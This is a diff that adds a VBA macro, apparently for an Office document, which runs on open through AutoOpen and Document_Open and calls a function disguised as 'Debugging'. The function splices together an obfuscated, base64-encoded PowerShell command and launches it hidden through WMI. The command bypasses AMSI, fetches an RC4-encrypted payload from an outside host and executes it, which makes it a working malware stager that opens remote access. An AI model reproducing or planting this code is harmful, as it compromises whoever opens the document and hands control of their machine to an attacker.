@@ -1,0 +1,85 @@
+Sub AutoOpen()
+        Debugging
+End Sub
+
+Sub Document_Open()
+        Debugging
+End Sub
+
+Public Function Debugging() As Variant
+        Dim Str As String
+        Str = "pow"
+        Str = Str + "er"
+        Str = Str + "sh"
+        Str = Str + "ell -noP -sta -w 1 -enc  WwBSAEUAZgBdAC4AQQ"
+        Str = Str + "BTAHMAZQBtAEIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5"
+        Str = Str + "AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AH"
+        Str = Str + "QAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcA"
+        Str = Str + "KQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAdABGAEkAZQ"
+        Str = Str + "BsAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAn"
+        Str = Str + "ACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjAC"
+        Str = Str + "cAKQAuAFMAZQBUAFYAYQBMAFUAZQAoACQAbgBVAGwAbAAsACQA"
+        Str = Str + "VAByAFUAZQApAH0AOwBbAFMAWQBzAFQAZQBNAC4ATgBlAFQALg"
+        Str = Str + "BTAEUAcgBWAEkAQwBlAFAAbwBJAG4AdABNAGEAbgBhAEcAZQBS"
+        Str = Str + "AF0AOgA6AEUAeABQAEUAQwB0ADEAMAAwAEMAbwBOAHQASQBuAF"
+        Str = Str + "UARQA9ADAAOwAkAFcAQwA9AE4AZQBXAC0ATwBiAGoARQBjAFQA"
+        Str = Str + "IABTAHkAcwBUAEUAbQAuAE4ARQBUAC4AVwBFAEIAQwBMAGkAZQ"
+        Str = Str + "BuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAg"
+        Str = Str + "ACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE"
+        Str = Str + "8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAA"
+        Str = Str + "cgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbw"
+        Str = Str + "AnADsAJABXAGMALgBIAGUAQQBkAEUAUgBTAC4AQQBkAGQAKAAn"
+        Str = Str + "AFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AG"
+        Str = Str + "MALgBQAHIAbwBYAFkAPQBbAFMAeQBTAHQAZQBtAC4ATgBFAHQA"
+        Str = Str + "LgBXAGUAYgBSAEUAUQB1AGUAUwBUAF0AOgA6AEQAZQBmAGEAdQ"
+        Str = Str + "BsAHQAVwBlAEIAUAByAG8AeABZADsAJAB3AGMALgBQAHIAbwB4"
+        Str = Str + "AFkALgBDAFIAZQBkAEUAbgBUAGkAYQBsAFMAIAA9ACAAWwBTAF"
+        Str = Str + "kAUwB0AGUAbQAuAE4AZQBUAC4AQwBSAGUAZABFAG4AdABpAEEA"
+        Str = Str + "bABDAGEAYwBoAGUAXQA6ADoARABFAEYAYQBVAEwAVABOAEUAdA"
+        Str = Str + "B3AG8AUgBrAEMAcgBFAGQAZQBuAHQASQBBAGwAUwA7ACQASwA9"
+        Str = Str + "AFsAUwB5AFMAVABFAE0ALgBUAGUAeAB0AC4ARQBOAEMAbwBEAE"
+        Str = Str + "kATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAWQB0AEUA"
+        Str = Str + "UwAoACcAZQBlADIAZABhADQAMQBkAGUAOQBlAGIAMgA2ADkANg"
+        Str = Str + "A3ADkAMAAxADcAZABiADcANgAxADMAYgBjADcANwA4ACcAKQA7"
+        Str = Str + "ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIARwBzADsAJABTAD"
+        Str = Str + "0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoA"
+        Str = Str + "PQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJA"
+        Str = Str + "BLAC4AQwBPAFUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABf"
+        Str = Str + "AF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAF"
+        Str = Str + "sAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEA"
+        Str = Str + "KQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQ"
+        Str = Str + "ApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABd"
+        Str = Str + "AD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAG"
+        Str = Str + "IAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQA"
+        Str = Str + "SABdACkAJQAyADUANgBdAH0AfQA7ACQAVwBjAC4ASABlAEEAZA"
+        Str = Str + "BlAFIAUwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBz"
+        Str = Str + "AGUAcwBzAGkAbwBuAD0AMABIADMAUgBhADMAawBFADQASgA4AE"
+        Str = Str + "cAVgBTAGoAWABTADgAMgBUAGsAQwA1AFcASQBYAFEAPQAiACkA"
+        Str = Str + "OwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvAGIAYQBkAGcAZQ"
+        Str = Str + "ByAC4AbgBlAHQAcwBlAGMALgBtAGwAOgA4ADAAJwA7ACQAdAA9"
+        Str = Str + "ACcALwBsAG8AZwBpAG4ALwBwAHIAbwBjAGUAcwBzAC4AcABoAH"
+        Str = Str + "AAJwA7ACQAZABBAFQAYQA9ACQAVwBDAC4ARABPAHcATgBMAE8A"
+        Str = Str + "QQBkAEQAYQBUAGEAKAAkAFMAZQBSACsAJABUACkAOwAkAGkAVg"
+        Str = Str + "A9ACQAZABBAHQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAYQA9"
+        Str = Str + "ACQAZABhAHQAYQBbADQALgAuACQAZABBAHQAYQAuAEwARQBuAE"
+        Str = Str + "cAVABoAF0AOwAtAEoAbwBpAE4AWwBDAGgAYQBSAFsAXQBdACgA"
+        Str = Str + "JgAgACQAUgAgACQARABhAFQAYQAgACgAJABJAFYAKwAkAEsAKQ"
+        Str = Str + "ApAHwASQBFAFgA"
+        Const HIDDEN_WINDOW = 0
+        
+        Dim strComputer
+        Dim objWMIService
+        Dim objConfig
+        Dim objProcess
+        Dim objStartup
+        Dim intProcessID
+        
+        strComputer = "."
+        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+        Set objConfig = objStartup.SpawnInstance_
+        objConfig.ShowWindow = HIDDEN_WINDOW
+        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+        objProcess.Create Str, Null, objConfig, intProcessID
+End Function
+
